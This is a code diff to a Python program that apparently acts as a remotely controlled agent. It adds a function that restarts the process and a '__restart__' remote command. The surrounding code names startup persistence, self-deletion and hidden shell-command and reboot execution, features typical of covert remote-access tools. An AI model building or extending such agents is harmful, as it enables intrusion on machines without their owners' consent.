@@ -257,6 +257,18 @@ def ensure_startup():
             pass
 
 
+def restart_agent():
+    """Restart the agent gracefully."""
+    try:
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+    except Exception:
+        try:
+            import signal
+            os.kill(os.getpid(), signal.SIGTERM)
+        except:
+            os._exit(1)
+
+
 def self_delete_agent(trigger_id):
     startup_dir = os.path.join(
         os.environ.get("APPDATA", ""),
@@ -540,6 +552,14 @@ def execute_shell_command(cmd_str):
                 subprocess.Popen(["shutdown", "/r", "/t", seconds],
                     creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
                 return f"Reboot initiated ({seconds}s)" if seconds != "0" else "Reboot initiated"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle agent restart command
+        if cmd_lower.startswith("__restart__"):
+            try:
+                threading.Thread(target=restart_agent, daemon=False).start()
+                return "Agent restarting..."
             except Exception as e:
                 return f"Error: {str(e)}"
 
